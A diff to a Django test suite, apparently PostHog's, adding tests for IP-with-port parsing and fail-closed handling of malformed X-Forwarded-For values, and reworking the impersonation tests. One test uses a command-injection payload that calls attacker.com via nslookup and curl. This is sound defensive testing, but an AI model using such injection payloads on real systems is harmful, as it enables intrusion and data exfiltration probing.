@@ -6,6 +6,7 @@ from unittest.mock import patch
 
 from django.conf import settings
 from django.core.cache import cache
+from django.test import Client as DjangoClient
 from django.urls import reverse
 
 from rest_framework import status
@@ -121,6 +122,35 @@ class TestAccessMiddleware(APIBaseTest):
             with self.settings(TRUST_ALL_PROXIES=True):
                 response = self.client.get("/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""})
                 self.assertNotIn(b"PostHog is not available", response.content)
+
+    def test_ip_with_port_stripped(self):
+        """IP addresses with ports should have the port stripped before validation."""
+        with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/24"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
+            # IPv4 with port
+            response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
+            self.assertNotIn(b"PostHog is not available", response.content)
+
+            # IPv6 with port (bracketed format)
+            response = self.client.get("/", headers={"x-forwarded-for": "[::1]:443"})
+            # ::1 is not in allowed blocks, so should be blocked
+            self.assertIn(b"PostHog is not available", response.content)
+
+    def test_malformed_ip_blocked(self):
+        """Malformed IPs and attack payloads should be blocked (fail closed)."""
+        with self.settings(ALLOWED_IP_BLOCKS=["0.0.0.0/0"], USE_X_FORWARDED_HOST=True, TRUST_ALL_PROXIES=True):
+            # Attack payload in XFF header
+            response = self.client.get(
+                "/", headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"}
+            )
+            self.assertIn(b"PostHog is not available", response.content)
+
+            # Invalid IP format
+            response = self.client.get("/", headers={"x-forwarded-for": "not-an-ip"})
+            self.assertIn(b"PostHog is not available", response.content)
+
+            # Valid IP should work
+            response = self.client.get("/", headers={"x-forwarded-for": "192.168.1.1"})
+            self.assertNotIn(b"PostHog is not available", response.content)
 
 
 class TestAutoProjectMiddleware(APIBaseTest):
@@ -479,12 +509,19 @@ class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
         self.user.is_staff = True
         self.user.save()
 
+        # Use Django's standard Client instead of APIClient for these tests.
+        # The loginas admin view expects form-encoded POST data, which is
+        # Django Client's default (APIClient defaults to JSON).
+        self.client = DjangoClient()
+        self.client.force_login(self.user)
+
     def get_csrf_token_payload(self):
         return {}
 
     def login_as_other_user(self):
         return self.client.post(
             reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
+            data={"read_only": "false"},
             follow=True,
         )
 
@@ -599,15 +636,23 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
         self.user.is_staff = True
         self.user.save()
 
+        # Use Django's standard Client instead of APIClient for these tests.
+        # The loginas admin view expects form-encoded POST data, which is
+        # Django Client's default (APIClient defaults to JSON).
+        self.client = DjangoClient()
+        self.client.force_login(self.user)
+
     def login_as_other_user(self):
         return self.client.post(
             reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
+            data={"read_only": "false"},
             follow=True,
         )
 
     def login_as_other_user_read_only(self):
         return self.client.post(
-            reverse("loginas-user-login-read-only", kwargs={"user_id": self.other_user.id}),
+            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
+            data={"read_only": "true"},
             follow=True,
         )
 
@@ -703,10 +748,7 @@ class TestImpersonationReadOnlyMiddleware(APIBaseTest):
         self.other_user.allow_impersonation = False
         self.other_user.save()
 
-        self.client.post(
-            reverse("loginas-user-login-read-only", kwargs={"user_id": self.other_user.id}),
-            follow=True,
-        )
+        self.login_as_other_user_read_only()
 
         # Should still be logged in as original user
         assert self.client.get("/api/users/@me").json()["email"] == self.user.email
